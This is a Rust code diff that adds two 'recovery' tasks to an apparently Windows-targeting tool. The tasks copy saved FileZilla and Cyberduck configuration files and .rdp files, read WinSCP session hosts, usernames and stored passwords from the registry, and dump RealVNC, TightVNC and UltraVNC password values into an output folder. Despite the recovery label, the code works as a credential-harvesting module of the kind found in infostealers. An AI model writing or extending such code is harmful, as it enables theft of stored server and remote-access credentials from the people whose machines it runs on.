@@ -5,13 +5,21 @@ use crate::recovery::{
 };
 use async_trait::async_trait;
 use std::env;
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use tokio::fs;
 use tokio::task::JoinSet;
+use winreg::{
+    RegKey,
+    enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE},
+};
 
 pub fn devops_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
-    vec![Arc::new(DevOpsRecoveryTask::new(ctx))]
+    vec![
+        Arc::new(DevOpsRecoveryTask::new(ctx)),
+        Arc::new(FtpClientsTask),
+        Arc::new(RdpVncTask),
+    ]
 }
 
 struct DevOpsRecoveryTask {
@@ -188,6 +196,178 @@ impl DevOpsRecoveryTask {
         });
 
         Self { specs }
+    }
+}
+
+struct FtpClientsTask;
+
+#[async_trait]
+impl RecoveryTask for FtpClientsTask {
+    fn label(&self) -> String {
+        "FTP Clients".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::DevOps
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+        let dest_root = ctx.output_dir.join("services").join("DevOps").join("FTP");
+        fs::create_dir_all(&dest_root).await?;
+
+        // FileZilla
+        let fz_dir = ctx.roaming_data_dir.join("FileZilla");
+        if fz_dir.exists() {
+            let fz_dest = dest_root.join("FileZilla");
+            fs::create_dir_all(&fz_dest).await?;
+            for file in ["sitemanager.xml", "recentservers.xml", "filezilla.xml"] {
+                copy_if_exists(&fz_dir.join(file), &fz_dest.join(file), "FileZilla", &mut artifacts).await;
+            }
+        }
+
+        // Cyberduck
+        let cd_dir = ctx.roaming_data_dir.join("Cyberduck");
+        if cd_dir.exists() {
+            let _ = crate::recovery::fs::copy_dir_limited(
+                &cd_dir.join("Profiles"),
+                &dest_root.join("Cyberduck"),
+                "Cyberduck",
+                &mut artifacts,
+                3,
+                100,
+            )
+            .await;
+        }
+
+        // WinSCP (Registry)
+        let winscp_key = RegKey::predef(HKEY_CURRENT_USER).open_subkey(r"Software\Martin Prikryl\WinSCP 2\Sessions");
+        if let Ok(key) = winscp_key {
+            let mut buffer = String::new();
+            for subkey_name in key.enum_keys().filter_map(Result::ok) {
+                if let Ok(subkey) = key.open_subkey(&subkey_name) {
+                    let host = subkey.get_value::<String, _>("HostName").unwrap_or_default();
+                    let user = subkey.get_value::<String, _>("UserName").unwrap_or_default();
+                    let pass = subkey.get_value::<String, _>("Password").unwrap_or_default(); // Encrypted A3
+                    if !host.is_empty() {
+                         buffer.push_str(&format!("Session: {}\nHost: {}\nUser: {}\nRawPassword: {}\n\n", subkey_name, host, user, pass));
+                    }
+                }
+            }
+            if !buffer.is_empty() {
+                 let target = dest_root.join("WinSCP_Sessions.txt");
+                 if let Ok(_) = fs::write(&target, buffer).await {
+                     if let Ok(meta) = fs::metadata(&target).await {
+                         artifacts.push(RecoveryArtifact {
+                             label: "WinSCP Registry".to_string(),
+                             path: target,
+                             size_bytes: meta.len(),
+                             modified: meta.modified().ok(),
+                         });
+                     }
+                 }
+            }
+        }
+        
+        // WinSCP (INI)
+        if let Ok(exe_path) = std::env::current_exe() {
+             let ini_path = exe_path.with_file_name("WinSCP.ini");
+             if ini_path.exists() {
+                 copy_if_exists(&ini_path, &dest_root.join("WinSCP.ini"), "WinSCP INI", &mut artifacts).await;
+             }
+        }
+
+        Ok(artifacts)
+    }
+}
+
+struct RdpVncTask;
+
+#[async_trait]
+impl RecoveryTask for RdpVncTask {
+    fn label(&self) -> String {
+        "RDP & VNC".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::DevOps
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+        let dest_root = ctx.output_dir.join("services").join("DevOps").join("RemoteAccess");
+        fs::create_dir_all(&dest_root).await?;
+
+        // RDP Files
+        let docs = ctx.home_dir.join("Documents");
+        if docs.exists() {
+             let mut entries = fs::read_dir(&docs).await?;
+             while let Some(entry) = entries.next_entry().await? {
+                 let path = entry.path();
+                 if path.extension().and_then(|s| s.to_str()).map(|s| s.eq_ignore_ascii_case("rdp")).unwrap_or(false) {
+                     copy_if_exists(&path, &dest_root.join(path.file_name().unwrap()), "RDP File", &mut artifacts).await;
+                 }
+             }
+        }
+        // Hidden Default.rdp
+        copy_if_exists(&docs.join("Default.rdp"), &dest_root.join("Default.rdp"), "Default RDP", &mut artifacts).await;
+        copy_if_exists(&ctx.home_dir.join("Default.rdp"), &dest_root.join("Home_Default.rdp"), "Home Default RDP", &mut artifacts).await;
+
+        // VNC Registry Dumps
+        let mut vnc_buffer = String::new();
+        
+        // RealVNC
+        if let Ok(key) = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(r"SOFTWARE\RealVNC\vncserver") {
+             if let Ok(pwd) = key.get_raw_value("Password").map(|v| v.bytes) {
+                 vnc_buffer.push_str(&format!("RealVNC (HKLM): {:?}\n", pwd));
+             }
+        }
+        
+        // TightVNC
+        if let Ok(key) = RegKey::predef(HKEY_CURRENT_USER).open_subkey(r"Software\TightVNC\Server") {
+             if let Ok(pwd) = key.get_value::<String, _>("Password") {
+                 vnc_buffer.push_str(&format!("TightVNC (HKCU): {}\n", pwd));
+             }
+             if let Ok(pwd) = key.get_value::<String, _>("ControlPassword") {
+                 vnc_buffer.push_str(&format!("TightVNC Control (HKCU): {}\n", pwd));
+             }
+        }
+        
+        // UltraVNC INI
+        let program_files = std::env::var("ProgramFiles").map(PathBuf::from).unwrap_or_else(|_| PathBuf::from(r"C:\Program Files"));
+        let uvnc_ini = program_files.join("UltraVNC").join("ultravnc.ini");
+        copy_if_exists(&uvnc_ini, &dest_root.join("ultravnc.ini"), "UltraVNC INI", &mut artifacts).await;
+
+        if !vnc_buffer.is_empty() {
+             let target = dest_root.join("VNC_Registry.txt");
+             if let Ok(_) = fs::write(&target, vnc_buffer).await {
+                  if let Ok(meta) = fs::metadata(&target).await {
+                      artifacts.push(RecoveryArtifact {
+                          label: "VNC Registry".to_string(),
+                          path: target,
+                          size_bytes: meta.len(),
+                          modified: meta.modified().ok(),
+                      });
+                  }
+             }
+        }
+
+        Ok(artifacts)
+    }
+}
+
+async fn copy_if_exists(src: &Path, dst: &Path, label: &str, artifacts: &mut Vec<RecoveryArtifact>) {
+    if src.exists() {
+        if let Ok(_) = fs::copy(src, dst).await {
+            if let Ok(meta) = fs::metadata(dst).await {
+                artifacts.push(RecoveryArtifact {
+                    label: label.to_string(),
+                    path: dst.to_path_buf(),
+                    size_bytes: meta.len(),
+                    modified: meta.modified().ok(),
+                });
+            }
+        }
     }
 }
 
